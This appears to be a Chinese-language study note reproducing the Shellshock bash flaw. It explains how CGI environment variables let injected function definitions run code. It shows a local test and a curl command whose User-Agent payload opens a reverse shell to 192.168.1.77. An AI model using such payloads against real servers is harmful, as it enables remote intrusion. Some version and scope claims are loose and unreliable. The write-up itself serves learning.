# shellshock  

本质就是一个bash的本地提权漏洞  

## 前置知识 
CGI  
基于浏览器的输入，然后在WEB服务器运行程序，让浏览器与用户产生交互，后台处理程序使用脚本语言解释执行用户端的请求

最初的时候 以为这个漏洞只是一个本地的提权漏洞并不能有什么暖用  
但是后面发现在一些linux服务器上使用了bash执行cgi的命令 所以我们可以通过导入

在bash环境当中再进行bash的时候(也就是创造bash子进程的时候，新的子进程会读取父进程的环境变量)，如果环境变量当中存在注入的命令也会进行执行

漏洞的本质就是在bash当中创建子bash的时候，子bash会运行父bash当中环境变量注入的代码

**影响范围**    
4.1之前的bash版本


## 复现以及分析  
在有问题的主机上执行命令
![20211027000910](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211027000910.png)
在没有问题的主机上执行命令  
![20211027000917](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211027000917.png)
前置知识   
bash和我们操作的shell 不是一个东西  
在shell 当中可以定义函数 然后使用export -f 导入环境变量当中 这样在bash就会执行所定义的函数了  
定义一个函数   
直接输入  foo(){ echo "eoc"; }  
bash的一个特性    
变量和函数在环境变量当中的表现形式是一样的  
这里有一个bash的bug 不管是变量还是函数在bash当中环境变量的表现形式都是一样的   
 ![20211027000945](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211027000945.png)
注意这个的存在之能是 export 之后的bash  
在bash当中创建一个子bash的时候，子bash会读取父bash当中的环境变量  
可以清楚地看到就算创建了在一个bash当中创建了另外一个bash，的确bash当中的环境变量会进行遗传  
我们的漏洞就是在这里 如果一个bash当中的环境变量当中存在注入的代码的话，在该bash创建子bash的时候就会执行bash当中注入的代码  
![20211027001011](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211027001011.png)
注意其中的空格符号 差一个空格会出错  
```
export a='() { echo "rock"; }; id'  
```
如果是一个正常的bash不存在bug  
![20211027001045](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211027001045.png)
远程提权
在CGI当中很多环境变量都是由外部的数据进行规定的，所以我们可以控制我们的HTTP请求头 UA等文件执行我们想要其执行的数据文件   
```
curl -A '() { :; }; /usr/local/bash-4.3.0/bin/bash -i >& /dev/tcp/192.168.1.77/1234 0>&1' http://192.168.1.75:8080/victim.cgi
```
有时候行 有时候不行  
## refer 

https://coolshell.cn/articles/11973.html